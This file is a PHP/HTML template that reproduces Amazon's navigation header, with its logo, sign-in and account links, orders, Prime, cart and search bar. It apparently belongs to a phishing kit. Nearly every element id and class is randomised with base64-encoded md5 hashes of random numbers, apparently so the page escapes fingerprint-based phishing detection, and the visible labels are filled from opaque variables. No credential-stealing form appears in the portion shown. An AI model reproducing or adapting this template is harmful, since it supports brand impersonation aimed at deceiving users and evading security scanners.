<header id="<?=base64_encode(md5(rand(00,1000)));?>" class="nav-locale-us nav-lang-en nav-ssl nav-rec nav-opt-sprite">
 <div id="navbar" role="navigation" class="nav-sprite-v1 nav-bluebeacon nav-packard-glow">
<div id="nav-belt" style="height:  55px;">
        <div class="nav-left">
<div id="nav-logo">
  <a class="nav-logo-link" tabindex="6">
    <span id="<?=base64_encode(md5(rand(00,1000)));?>"class="nav-logo-base nav-sprite">Amazon</span>
    <span id="<?=base64_encode(md5(rand(00,1000)));?>"class="nav-logo-ext nav-sprite"></span>
    <span id="<?=base64_encode(md5(rand(00,1000)));?>" class="nav-logo-locale nav-sprite"></span>
  </a>
  <a aria-label="" tabindex="7" class="nav-logo-tagline nav-sprite nav-prime-try"><?php echo $m3il9a_1;?></a>
</div>
        </div>
        <div class="nav-right">
  <div class="<?=base64_encode(md5(rand(00,1000)));?>" id="nav-swmslot">
    <div class="<?=base64_encode(md5(rand(00,1000)));?>" style=" margin-top: -1px; " id="nav-tools">
<a id="icp-nav-flyout" class="nav-a nav-a-2 icp-link-style-2">
  <span class="icp-nav-link-inner">
    <span id="<?=base64_encode(md5(rand(00,1000)));?>" class="nav-line-1">
      <span id="<?=base64_encode(md5(rand(00,1000)));?>" class="icp-nav-globe-img-2"></span>
      <span id="<?=base64_encode(md5(rand(00,1000)));?>"class="icp-nav-language"><?php echo $m3il9a_4;?></span>
    </span>
    <span id="<?=base64_encode(md5(rand(00,1000)));?>"class="nav-line-2">&nbsp;
      <span id="<?=base64_encode(md5(rand(00,1000)));?>" class="nav-icon nav-arrow" style="visibility: visible;"></span>
    </span>
  </span>
  <span class="icp-nav-link-border"></span>
</a>
<a class="nav-a nav-a-2 nav-truncate" data-nav-ref="nav_ya_signin" data-nav-role="signin" data-ux-jq-mouseenter="true" id="nav-link-accountList" tabindex="61"><span class="nav-line-1"><?php echo $m3il9a_5;?></span>
<span class="nav-line-2" style="margin-top: 2px;"><?php echo $m3il9a_6;?><span class="nav-icon nav-arrow" style="visibility: visible;"></span></span>
<span class="nav-line-4"><?php echo $m3il9a_6;?></span></a><a class="nav-a nav-a-2 nav-single-row-link" id="nav-orders" tabindex="63"><span class="nav-line-1"></span>
<span class="nav-line-2" style="margin-top: 2px;"><?php echo $m3il9a_7;?><span class="nav-icon nav-arrow" style="visibility: visible;"></span></span></a><a class="nav-a nav-a-2 nav-single-row-link" data-ux-jq-mouseenter="true" id="nav-link-prime" tabindex="64"><span class="nav-line-1"></span>
<span class="nav-line-2" style="margin-top: 2px;"><?php echo $m3il9a_1;?><span class="nav-icon nav-arrow" style="visibility: visible;"></span></span></a><a aria-label="0 items in cart" class="nav-a nav-a-2" id="nav-cart" tabindex="65" style=" margin-top: 2px;">
<span aria-hidden="true" class="nav-line-1"></span><span aria-hidden="true" class="nav-line-2"><?php echo $m3il9a_8;?><span class="nav-icon nav-arrow"></span></span><span class="nav-cart-icon nav-sprite"></span><span id="nav-cart-count" aria-hidden="true" class="nav-cart-count nav-cart-0">0</span></a>
</div>
  </div>
        </div>
        <div class="nav-fill">
<div class="<?=base64_encode(md5(rand(00,1000)));?>"id="nav-search">
  <div class="<?=base64_encode(md5(rand(00,1000)));?>" id="nav-bar-left"></div>
  <div id="<?=base64_encode(md5(rand(00,1000)));?>"accept-charset="utf-8" class="nav-searchbar" method="GET" name="site-search" role="search">
    <div id="<?=base64_encode(md5(rand(00,1000)));?>" class="nav-left">
      <div  id="<?=base64_encode(md5(rand(00,1000)));?>"class="nav-search-scope nav-sprite">
<div id="<?=base64_encode(md5(rand(00,1000)));?>" class="nav-search-facade" data-value="search-alias=aps">
  <span id="<?=base64_encode(md5(rand(00,1000)));?>" class="nav-search-label" style="width: auto;"><?php echo $m3il9a_2;?></span>
  <i class="nav-icon"></i>
</div>
  <span class="<?=base64_encode(md5(rand(00,1000)));?>" id="searchDropdownDescription" style="display:none"><?php echo $m3il9a_3;?></span>
</div>
    </div>
    <div class="nav-right">
      <div class="nav-search-submit nav-sprite">
<span id="nav-search-submit-text" class="nav-search-submit-text nav-sprite">Go</span>
        <input id="<?=base64_encode(md5(rand(00,1000)));?>" type="submit" class="nav-input" value="Go" tabindex="20">
      </div>
    </div>
    <div id="<?=base64_encode(md5(rand(00,1000)));?>" class="nav-fill">
      <div id="<?=base64_encode(md5(rand(00,1000)));?>" class="nav-search-field ">
        <label id="nav-search-label" for="twotabsearchtextbox" class="aok-offscreen">
          Search
        </label>
        <input type="text" id="twotabsearchtextbox" value="" name="field-keywords" autocomplete="off" placeholder="<?php echo $m3il9a_3;?>" class="nav-input" dir="auto" tabindex="19">
      </div>
      <div id="nav-iss-attach"></div>
    </div>
  </div>
</div>
</div>
  </div>
</div>
</header>